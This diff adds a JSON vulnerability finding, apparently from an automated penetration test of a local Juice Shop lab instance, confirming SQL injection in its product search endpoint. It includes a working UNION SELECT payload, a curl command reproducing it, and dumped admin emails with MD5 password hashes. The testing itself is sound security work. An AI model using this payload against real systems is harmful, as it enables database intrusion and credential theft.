@@ -1,0 +1,28 @@
+{
+  "id": "f_1784835486491_1f790b",
+  "action": "confirm",
+  "title": "SQL Injection in Product Search API",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "/rest/products/search?q=",
+  "url": "/rest/products/search?q=",
+  "description": "The REST API endpoint /rest/products/search?q= is vulnerable to UNION-based SQL injection (SQLite 3.44.2). The 'q' parameter is directly concatenated into SQL queries without parameterization. Using a UNION SELECT payload, all 25 user records including emails, password hashes (MD5), and roles were extracted from the Users table.",
+  "poc": "Request: GET /rest/products/search?q=test'))UNION+SELECT+id,email,password,role,deletedAt,6,7,8,9+FROM+Users-- \nObservation: HTTP 200 response with JSON returning 25 records. Example: ID:1 Email:admin@juice-sh.op PwdHash:0192023a7bbd73250516f069df18b500 Role:admin",
+  "proof": "Status: success, Total records: 25, ID:1 Email:admin@juice-sh.op PwdHash:0192023a7bbd73250516f069df18b500 Role:admin, ID:4 Email:bjoern.kimminich@gmail.com PwdHash:6edd9d726cbdc873c539e41ae8757b8c Role:admin, SQLite version: 3.44.2",
+  "how_captured": "shell: # Re-run SQL injection to capture exact proof output for booking curl -s \"http://127.0.0.1:3011/rest/products/search?q=test'))UNION+SELECT+id,email,password,rol",
+  "evidence_ids": [
+    "ev_1784835485836_16400f"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784835485836_16400f",
+      "excerpt": "Status: success, Total records: 25, ID:1 Email:admin@juice-sh.op PwdHash:0192023a7bbd73250516f069df18b500 Role:admin, ID:4 Email:bjoern.kimminich@gmail.com PwdHash:6edd9d726cbdc873c539e41ae8757b8c Role:admin, SQLite version: 3.44.2",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "shell: # Re-run SQL injection to capture exact proof output for booking curl -s \"http://127.0.0.1:3011/rest/products/search?q=test'))UNION+SELECT+id,email,password,rol"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3011",
+  "created_at": "2026-07-23T19:38:06.491Z"
+}
